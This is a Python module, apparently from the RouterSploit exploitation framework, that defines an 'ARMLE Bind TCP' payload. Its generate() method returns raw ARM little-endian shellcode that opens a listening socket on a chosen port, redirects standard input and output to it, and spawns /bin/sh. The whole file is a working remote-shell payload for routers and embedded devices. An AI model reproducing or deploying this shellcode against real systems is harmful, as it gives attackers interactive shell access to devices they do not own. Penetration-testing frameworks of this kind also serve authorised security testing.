from routersploit.core.exploit import *
from routersploit.core.exploit.payloads import (
    ArchitectureSpecificPayload,
    Architectures,
    BindTCPPayloadMixin,
)


class Payload(BindTCPPayloadMixin, ArchitectureSpecificPayload):
    __info__ = {
        "name": "ARMLE Bind TCP",
        "description": "Creates interactive tcp bind shell for ARMLE architecture.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
    }

    architecture = Architectures.ARMLE

    def generate(self):
        bind_port = utils.convert_port(self.rport)

        return (
            b"\x02\x00\xa0\xe3" +
            b"\x01\x10\xa0\xe3" +
            b"\x06\x20\xa0\xe3" +
            b"\x07\x00\x2d\xe9" +
            b"\x01\x00\xa0\xe3" +
            b"\x0d\x10\xa0\xe1" +
            b"\x66\x00\x90\xef" +
            b"\x0c\xd0\x8d\xe2" +
            b"\x00\x60\xa0\xe1" +
            bind_port[1:2] + b"\x10\xa0\xe3" +
            bind_port[0:1] + b"\x70\xa0\xe3" +
            b"\x01\x1c\xa0\xe1" +
            b"\x07\x18\x81\xe0" +
            b"\x02\x10\x81\xe2" +
            b"\x02\x20\x42\xe0" +
            b"\x06\x00\x2d\xe9" +
            b"\x0d\x10\xa0\xe1" +
            b"\x10\x20\xa0\xe3" +
            b"\x07\x00\x2d\xe9" +
            b"\x02\x00\xa0\xe3" +
            b"\x0d\x10\xa0\xe1" +
            b"\x66\x00\x90\xef" +
            b"\x14\xd0\x8d\xe2" +
            b"\x06\x00\xa0\xe1" +
            b"\x03\x00\x2d\xe9" +
            b"\x04\x00\xa0\xe3" +
            b"\x0d\x10\xa0\xe1" +
            b"\x66\x00\x90\xef" +
            b"\x08\xd0\x8d\xe2" +
            b"\x06\x00\xa0\xe1" +
            b"\x01\x10\x41\xe0" +
            b"\x02\x20\x42\xe0" +
            b"\x07\x00\x2d\xe9" +
            b"\x05\x00\xa0\xe3" +
            b"\x0d\x10\xa0\xe1" +
            b"\x66\x00\x90\xef" +
            b"\x0c\xd0\x8d\xe2" +
            b"\x00\x60\xa0\xe1" +
            b"\x02\x10\xa0\xe3" +
            b"\x06\x00\xa0\xe1" +
            b"\x3f\x00\x90\xef" +
            b"\x01\x10\x51\xe2" +
            b"\xfb\xff\xff\x5a" +
            b"\x04\x10\x4d\xe2" +
            b"\x02\x20\x42\xe0" +
            b"\x2f\x30\xa0\xe3" +
            b"\x62\x70\xa0\xe3" +
            b"\x07\x34\x83\xe0" +
            b"\x69\x70\xa0\xe3" +
            b"\x07\x38\x83\xe0" +
            b"\x6e\x70\xa0\xe3" +
            b"\x07\x3c\x83\xe0" +
            b"\x2f\x40\xa0\xe3" +
            b"\x73\x70\xa0\xe3" +
            b"\x07\x44\x84\xe0" +
            b"\x68\x70\xa0\xe3" +
            b"\x07\x48\x84\xe0" +
            b"\x73\x50\xa0\xe3" +
            b"\x68\x70\xa0\xe3" +
            b"\x07\x54\x85\xe0" +
            b"\x3e\x00\x2d\xe9" +
            b"\x08\x00\x8d\xe2" +
            b"\x00\x10\x8d\xe2" +
            b"\x04\x20\x8d\xe2" +
            b"\x0b\x00\x90\xef"
        )
